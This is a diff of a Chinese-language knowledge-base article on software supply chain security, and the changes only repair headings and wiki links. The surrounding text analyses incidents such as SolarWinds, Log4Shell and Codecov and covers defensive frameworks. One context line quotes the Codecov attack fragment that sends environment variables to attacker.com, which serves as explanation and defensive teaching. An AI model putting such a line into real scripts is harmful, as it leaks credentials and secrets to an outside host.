@@ -77,7 +77,7 @@ created: "2026-05-23"
 
 <!-- chunk: 1. 供应链安全简介 -->## 1. 供应链安全简介
 
-#<!-- chunk: 1.1 什么是软件供应链 (What is Software Supply Chain) -->## 1.1 什么是软件供应链 (What is Software Supply Chain)
+## 1.1 什么是软件供应链 (What is Software Supply Chain)
 
 软件供应链是指软件从开发到交付过程中涉及的所有组件、工具、流程和参与者的集合。
 
@@ -105,7 +105,7 @@ created: "2026-05-23"
 | 制品仓库 | 存储和分发 | 仓库污染 |
 | 部署环境 | 运行时基础设施 | 环境污染 |
 
-#<!-- chunk: 1.2 供应链攻击的定义与分类 -->## 1.2 供应链攻击的定义与分类
+## 1.2 供应链攻击的定义与分类
 
 供应链攻击是指攻击者通过破坏软件开发、构建或分发过程中的某个环节，将恶意代码或后门植入最终软件产品的攻击方式。
 
@@ -138,7 +138,7 @@ graph TD
     F --> F3[更新机制绕过]
 ```
 
-#<!-- chunk: 1.3 供应链安全的重要性 -->## 1.3 供应链安全的重要性
+## 1.3 供应链安全的重要性
 
 2021年以来，供应链攻击已成为网络安全领域增长最快的威胁类型：
 
@@ -151,9 +151,9 @@ graph TD
 
 <!-- chunk: 2. 重大安全事件分析 -->## 2. 重大安全事件分析
 
-#<!-- chunk: 2.1 SolarWinds 攻击事件 (2020) -->## 2.1 SolarWinds 攻击事件 (2020)
+## 2.1 SolarWinds 攻击事件 (2020)
 
-##<!-- chunk: 事件背景 -->## 事件背景
+## 事件背景
 
 SolarWinds Orion 是广泛使用的 IT 监控平台，攻击者（Nobelium/APT29）在 2020 年 3 月至 6 月期间成功入侵其构建系统，将恶意代码植入合法软件更新中。
 
@@ -168,7 +168,7 @@ SolarWinds 攻击时间线:
 2021年01月 ──── 完整调查报告发布
 ```
 
-##<!-- chunk: 技术分析 -->## 技术分析
+## 技术分析
 
 ```
 攻击链分解:
@@ -191,7 +191,7 @@ SolarWinds 攻击时间线:
 [数据外泄]
 ```
 
-##<!-- chunk: 受害者影响 -->## 受害者影响
+## 受害者影响
 
 | 受害机构 | 影响程度 |
 |---------|---------|
@@ -202,7 +202,7 @@ SolarWinds 攻击时间线:
 | 9个联邦机构 | 不同程度失陷 |
 | 100+私企 | 受到感染 |
 
-##<!-- chunk: 教训与防御措施 -->## 教训与防御措施
+## 教训与防御措施
 
 ```yaml
 # SolarWinds 事件防御检查清单
@@ -226,9 +226,9 @@ SolarWinds 攻击时间线:
     - 网络流量异常检测
 ```
 
-#<!-- chunk: 2.2 Log4Shell 漏洞事件 (2021) -->## 2.2 Log4Shell 漏洞事件 (2021)
+## 2.2 Log4Shell 漏洞事件 (2021)
 
-##<!-- chunk: 漏洞概述 -->## 漏洞概述
+## 漏洞概述
 
 CVE-2021-44228（Log4Shell）是 Apache Log4j 2 中的远程代码执行漏洞，CVSS 评分 10.0（满分），影响全球数亿个系统。
 
@@ -253,7 +253,7 @@ Log4Shell 漏洞利用链:
                    在目标系统执行任意代码
 ```
 
-##<!-- chunk: 影响范围分析 -->## 影响范围分析
+## 影响范围分析
 
 ```mermaid
 graph LR
@@ -278,7 +278,7 @@ graph LR
     J --> L
 ```
 
-##<!-- chunk: 供应链视角的教训 -->## 供应链视角的教训
+## 供应链视角的教训
 
 ```
 Log4Shell 暴露的供应链问题:
@@ -321,9 +321,9 @@ java -Dlog4j2.formatMsgNoLookups=true -jar app.jar
 # 最终解决方案：升级到 2.17.1+
 ```
 
-#<!-- chunk: 2.3 Codecov 供应链攻击 (2021) -->## 2.3 Codecov 供应链攻击 (2021)
+## 2.3 Codecov 供应链攻击 (2021)
 
-##<!-- chunk: 事件描述 -->## 事件描述
+## 事件描述
 
 2021年4月，Codecov（代码覆盖率服务）的 Bash Uploader 脚本被篡改，攻击者通过修改官方脚本中的 URL，将环境变量（包括 API 密钥、令牌）发送到攻击者控制的服务器。
 
@@ -355,14 +355,14 @@ $(env)" http://attacker.com/upload/v2
 [攻击者利用盗取的凭据横向移动到客户系统]
 ```
 
-##<!-- chunk: 影响评估 -->## 影响评估
+## 影响评估
 
 - **持续时间**：2021年1月31日 - 2021年4月1日（约2个月）
 - **受影响工具**：Codecov Bash Uploader 所有版本
 - **受害企业**：包括 Twilio、HashiCorp、Confluent 等知名企业
 - **泄露数据类型**：AWS 密钥、GitHub Token、内部 API 密钥等
 
-##<!-- chunk: 防御策略 -->## 防御策略
+## 防御策略
 
 ```bash
 # 脚本完整性验证最佳实践
@@ -395,9 +395,9 @@ chmod +x codecov
     chmod +x codecov && ./codecov
 ```
 
-#<!-- chunk: 2.4 npm 包污染事件案例 -->## 2.4 npm 包污染事件案例
+## 2.4 npm 包污染事件案例
 
-##<!-- chunk: event-stream 事件 (2018) -->## event-stream 事件 (2018)
+## event-stream 事件 (2018)
 
 ```
 事件经过:
@@ -413,7 +413,7 @@ chmod +x codecov
 - 受影响最终用户: 数百万比特币钱包用户
 ```
 
-##<!-- chunk: colors.js 和 faker.js 破坏事件 (2022) -->## colors.js 和 faker.js 破坏事件 (2022)
+## colors.js 和 faker.js 破坏事件 (2022)
 
 ```javascript
 // 开发者 Marak Squires 故意破坏自己维护的包
@@ -433,7 +433,7 @@ chmod +x codecov
 
 <!-- chunk: 3. 攻击向量与威胁模型 -->## 3. 攻击向量与威胁模型
 
-#<!-- chunk: 3.1 MITRE ATT&CK 供应链攻击矩阵 -->## 3.1 MITRE ATT&CK 供应链攻击矩阵
+## 3.1 MITRE ATT&CK 供应链攻击矩阵
 
 ```mermaid
 graph TD
@@ -453,7 +453,7 @@ graph TD
     D --> D3[DNS 污染]
 ```
 
-#<!-- chunk: 3.2 OWASP 十大供应链风险 -->## 3.2 OWASP 十大供应链风险
+## 3.2 OWASP 十大供应链风险
 
 | 排名 | 风险类型 | 描述 | 严重程度 |
 |------|---------|------|---------|
@@ -468,7 +468,7 @@ graph TD
 | 9 | 私有包外泄 | 内部组件意外发布到公共仓库 | 高危 |
 | 10 | 软件物料清单缺失 | 无法追踪软件组件 | 高危 |
 
-#<!-- chunk: 3.3 供应链威胁建模 -->## 3.3 供应链威胁建模
+## 3.3 供应链威胁建模
 
 ```
 STRIDE 威胁模型应用于供应链:
@@ -500,7 +500,7 @@ STRIDE 威胁模型应用于供应链:
 └──────────────────────────────────────────────────────────┘
 ```
 
-#<!-- chunk: 3.4 依赖混淆攻击详解 -->## 3.4 依赖混淆攻击详解
+## 3.4 依赖混淆攻击详解
 
 ```python
 # 依赖混淆攻击原理
@@ -532,7 +532,7 @@ index-url = https://internal.company.com/simple/
 }
 ```
 
-#<!-- chunk: 3.5 恶意 CI/CD 攻击向量 -->## 3.5 恶意 CI/CD 攻击向量
+## 3.5 恶意 CI/CD 攻击向量
 
 ```yaml
 # GitHub Actions 中的常见攻击场景
@@ -572,7 +572,7 @@ jobs:
 
 <!-- chunk: 4. 深度防御策略 -->## 4. 深度防御策略
 
-#<!-- chunk: 4.1 纵深防御架构 -->## 4.1 纵深防御架构
+## 4.1 纵深防御架构
 
 ```mermaid
 graph TB
@@ -617,7 +617,7 @@ graph TB
     D1 & D2 & D3 & D4 --> E1
 ```
 
-#<!-- chunk: 4.2 代码完整性保护 -->## 4.2 代码完整性保护
+## 4.2 代码完整性保护
 
 ```bash
 # Git 提交签名配置
@@ -659,7 +659,7 @@ curl -X PUT \
   }'
 ```
 
-#<!-- chunk: 4.3 依赖安全管理 -->## 4.3 依赖安全管理
+## 4.3 依赖安全管理
 
 ```toml
 # Cargo.toml (Rust) - 版本锁定示例
@@ -725,7 +725,7 @@ jobs:
           allow-licenses: MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause
 ```
 
-#<!-- chunk: 4.4 构建环境安全 -->## 4.4 构建环境安全
+## 4.4 构建环境安全
 
 ```dockerfile
 # 安全的多阶段构建配置
@@ -815,7 +815,7 @@ echo "Provenance generated: $OUTPUT_FILE"
 
 <!-- chunk: 5. 零信任供应链架构 -->## 5. 零信任供应链架构
 
-#<!-- chunk: 5.1 零信任原则在供应链中的应用 -->## 5.1 零信任原则在供应链中的应用
+## 5.1 零信任原则在供应链中的应用
 
 ```
 传统安全模型 vs 零信任供应链:
@@ -841,7 +841,7 @@ echo "Provenance generated: $OUTPUT_FILE"
 └─────────────────────────────────┘
 ```
 
-#<!-- chunk: 5.2 零信任供应链技术栈 -->## 5.2 零信任供应链技术栈
+## 5.2 零信任供应链技术栈
 
 ```mermaid
 graph TB
@@ -878,7 +878,7 @@ graph TB
     E --> J
 ```
 
-#<!-- chunk: 5.3 Sigstore 生态系统 -->## 5.3 Sigstore 生态系统
+## 5.3 Sigstore 生态系统
 
 Sigstore 是 Linux 基金会支持的开源供应链安全项目，提供无密钥签名基础设施。
 
@@ -928,7 +928,7 @@ cosign attest \
   ghcr.io/myorg/myapp:v1.0.0
 ```
 
-#<!-- chunk: 5.4 OPA/Gatekeeper 供应链策略 -->## 5.4 OPA/Gatekeeper 供应链策略
+## 5.4 OPA/Gatekeeper 供应链策略
 
 ```rego
 # supply-chain-policy.rego
@@ -1009,7 +1009,7 @@ spec:
 
 <!-- chunk: 6. 行业框架与标准 -->## 6. 行业框架与标准
 
-#<!-- chunk: 6.1 主要框架概览 -->## 6.1 主要框架概览
+## 6.1 主要框架概览
 
 ```
 供应链安全框架生态系统:
@@ -1035,7 +1035,7 @@ spec:
 └──────────────────────────────────────────────────────────┘
 ```
 
-#<!-- chunk: 6.2 拜登行政令 14028 (EO 14028) -->## 6.2 拜登行政令 14028 (EO 14028)
+## 6.2 拜登行政令 14028 (EO 14028)
 
 2021年5月，美国总统拜登签署了"改善国家网络安全"行政令，对供应链安全提出了明确要求：
 
@@ -1047,7 +1047,7 @@ spec:
 | 端点检测响应 | 2022年1月 | 部署 EDR 解决方案 |
 | 零信任架构 | 2024年9月 | 联邦机构迁移到零信任 |
 
-#<!-- chunk: 6.3 OpenSSF Scorecard -->## 6.3 OpenSSF Scorecard
+## 6.3 OpenSSF Scorecard
 
 ```bash
 # OpenSSF Scorecard - 评估开源项目安全性
@@ -1115,7 +1115,7 @@ scorecard --repo github.com/myorg/myproject \
 
 <!-- chunk: 7. NIST SSDF 框架详解 -->## 7. NIST SSDF 框架详解
 
-#<!-- chunk: 7.1 NIST SP 800-218 概述 -->## 7.1 NIST SP 800-218 概述
+## 7.1 NIST SP 800-218 概述
 
 NIST 安全软件开发框架（Secure Software Development Framework, SSDF）提供了一套综合的安全软件开发最佳实践集合。
 
@@ -1145,9 +1145,9 @@ SSDF 四大实践组:
 └─────────────────────────────────────────────────────────┘
 ```
 
-#<!-- chunk: 7.2 SSDF 实践详解 -->## 7.2 SSDF 实践详解
+## 7.2 SSDF 实践详解
 
-##<!-- chunk: PO (准备组织) 实践 -->## PO (准备组织) 实践
+## PO (准备组织) 实践
 
 ```yaml
 # SSDF PO 实践检查清单
@@ -1199,7 +1199,7 @@ PO.3 实施安全开发工具:
       容器扫描: [Trivy, Grype, Clair]
 ```
 
-##<!-- chunk: PS (保护软件) 实践 -->## PS (保护软件) 实践
+## PS (保护软件) 实践
 
 ```bash
 # PS.1 保护代码库访问
@@ -1246,7 +1246,7 @@ spec:
 EOF
 ```
 
-#<!-- chunk: 7.3 SSDF 与 EO 14028 映射 -->## 7.3 SSDF 与 EO 14028 映射
+## 7.3 SSDF 与 EO 14028 映射
 
 ```
 SSDF 实践 → EO 14028 要求 映射:
@@ -1274,7 +1274,7 @@ EO 要求: 安全开发实践
 
 <!-- chunk: 8. SLSA 框架概述 -->## 8. SLSA 框架概述
 
-#<!-- chunk: 8.1 SLSA 简介 -->## 8.1 SLSA 简介
+## 8.1 SLSA 简介
 
 SLSA（Supply chain Levels for Software Artifacts，软件制品供应链级别）是由 Google 提出、OpenSSF 维护的供应链安全框架。
 
@@ -1291,7 +1291,7 @@ SLSA 目标:
 4. 提高安全性的可见性和可审计性
 ```
 
-#<!-- chunk: 8.2 SLSA 级别概览 -->## 8.2 SLSA 级别概览
+## 8.2 SLSA 级别概览
 
 ```mermaid
 graph LR
@@ -1306,7 +1306,7 @@ graph LR
     L4 -.-> |两人审查\n密封构建| N4[最高安全]
 ```
 
-#<!-- chunk: 8.3 SLSA 出处（Provenance） -->## 8.3 SLSA 出处（Provenance）
+## 8.3 SLSA 出处（Provenance）
 
 ```json
 // SLSA v1.0 出处格式示例
@@ -1358,7 +1358,7 @@ graph LR
 
 <!-- chunk: 9. 云原生供应链安全生态 -->## 9. 云原生供应链安全生态
 
-#<!-- chunk: 9.1 CNCF 供应链安全项目 -->## 9.1 CNCF 供应链安全项目
+## 9.1 CNCF 供应链安全项目
 
 ```
 CNCF 供应链安全项目全景:
@@ -1395,7 +1395,7 @@ SBOM 工具:
 └── External Secrets Operator
 ```
 
-#<!-- chunk: 9.2 完整供应链安全管道 -->## 9.2 完整供应链安全管道
+## 9.2 完整供应链安全管道
 
 ```yaml
 # 完整的 GitHub Actions 供应链安全管道
@@ -1539,7 +1539,7 @@ jobs:
 
 <!-- chunk: 10. 实施路径与最佳实践 -->## 10. 实施路径与最佳实践
 
-#<!-- chunk: 10.1 供应链安全成熟度路径 -->## 10.1 供应链安全成熟度路径
+## 10.1 供应链安全成熟度路径
 
 ```mermaid
 graph TB
@@ -1575,7 +1575,7 @@ graph TB
     L4 --- L4d[定期安全评估]
 ```
 
-#<!-- chunk: 10.2 关键安全控制清单 -->## 10.2 关键安全控制清单
+## 10.2 关键安全控制清单
 
 ```bash
 #!/bin/bash
@@ -1664,7 +1664,7 @@ echo ""
 echo "=== 检查完成 ==="
 ```
 
-#<!-- chunk: 10.3 事件响应计划 -->## 10.3 事件响应计划
+## 10.3 事件响应计划
 
 ```yaml
 # 供应链安全事件响应计划
@@ -1727,7 +1727,7 @@ incident-response:
 
 <!-- chunk: 11. 合规性与监管要求 -->## 11. 合规性与监管要求
 
-#<!-- chunk: 11.1 合规框架映射 -->## 11.1 合规框架映射
+## 11.1 合规框架映射
 
 | 合规框架 | 供应链相关要求 | 关键控制 |
 |---------|--------------|---------|
@@ -1738,7 +1738,7 @@ incident-response:
 | FedRAMP | 多个控制族 | 配置管理、变更控制 |
 | CMMC 2.0 | SI.2 恶意代码防护 | 制品完整性验证 |
 
-#<!-- chunk: 11.2 SBOM 合规要求 -->## 11.2 SBOM 合规要求
+## 11.2 SBOM 合规要求
 
 ```
 SBOM 监管要求时间线:
@@ -1751,7 +1751,7 @@ SBOM 监管要求时间线:
 2024-06 ─ DoD CMMC 2.0 正式生效，含供应链要求
 ```
 
-#<!-- chunk: 11.3 审计和合规文档化 -->## 11.3 审计和合规文档化
+## 11.3 审计和合规文档化
 
 ```bash
 # 生成合规证据包
@@ -1801,7 +1801,7 @@ ls -lh "$EVIDENCE_DIR"
 
 <!-- chunk: 12. 未来趋势与挑战 -->## 12. 未来趋势与挑战
 
-#<!-- chunk: 12.1 新兴威胁 -->## 12.1 新兴威胁
+## 12.1 新兴威胁
 
 ```mermaid
 graph TD
@@ -1827,7 +1827,7 @@ graph TD
     E --> E3[维护疲劳利用]
 ```
 
-#<!-- chunk: 12.2 技术发展方向 -->## 12.2 技术发展方向
+## 12.2 技术发展方向
 
 **1. 确定性构建（Deterministic Builds）**
 
@@ -1886,7 +1886,7 @@ AI 增强供应链安全能力:
   - 零日漏洞早期预警
 ```
 
-#<!-- chunk: 12.3 后量子密码迁移 -->## 12.3 后量子密码迁移
+## 12.3 后量子密码迁移
 
 ```bash
 # 准备后量子密码迁移
@@ -1911,7 +1911,7 @@ AI 增强供应链安全能力:
 
 <!-- chunk: 参考资料与扩展阅读 -->## 参考资料与扩展阅读
 
-#<!-- chunk: 官方文档 -->## 官方文档
+## 官方文档
 
 | 资源 | URL | 描述 |
 |------|-----|------|
@@ -1922,7 +1922,7 @@ AI 增强供应链安全能力:
 | CISA | https://www.cisa.gov/supply-chain | 供应链安全指南 |
 | in-toto | https://in-toto.io | 供应链完整性框架 |
 
-#<!-- chunk: 工具资源 -->## 工具资源
+## 工具资源
 
 ```bash
 # 供应链安全工具安装汇总
@@ -1957,10 +1957,10 @@ go install github.com/slsa-framework/slsa-verifier/v2/cli/slsa-verifier@latest
 <!-- chunk: Obsidian 相关文档 -->## Obsidian 相关文档
 
 - domain-05-security-compliance KUDIG Database — Global MOC
-- [[domain-05-security-compliance/README|[[Domain 39: 供应链安全 (Supply Chain Security)|Domain 39: 供应链安全 (Supply Chain Security)]]]]
-- [[domain-05-security-compliance/00-open-source-projects-index|Domain-39 供应链安全 — 开源项目索引]]
-- [[domain-05-security-compliance/05-supply-chain/02-supply-chain-maturity-model]]
-- [[domain-05-security-compliance/05-supply-chain/03-sbom-generation-management]]
+- [[domain-05-security-compliance/README.md|[[Domain 39: 供应链安全 (Supply Chain Security)|Domain 39: 供应链安全 (Supply Chain Security)]]]]
+- [[domain-05-security-compliance/00-open-source-projects-index.md|Domain-39 供应链安全 — 开源项目索引]]
+- [[domain-05-security-compliance/05-supply-chain/02-supply-chain-maturity-model.md|02 supply chain maturity model]]
+- [[domain-05-security-compliance/05-supply-chain/03-sbom-generation-management.md|03 sbom generation management]]
 - SBOM 漏洞分析与治理 (SBOM Vulnerability Analysis and Governance)
 - SLSA 级别与实施 (SLSA Levels and Implementation)
 - GitHub Actions SLSA 构建 (GitHub Actions SLSA Build)
@@ -1976,4 +1976,4 @@ go install github.com/slsa-framework/slsa-verifier/v2/cli/slsa-verifier@latest
 - 02-supply-chain-maturity-model
 - 03-sbom-generation-management
 
-- [[domain-05-security-compliance/README|返回目录]]
+- [[domain-05-security-compliance/README.md|返回目录]]
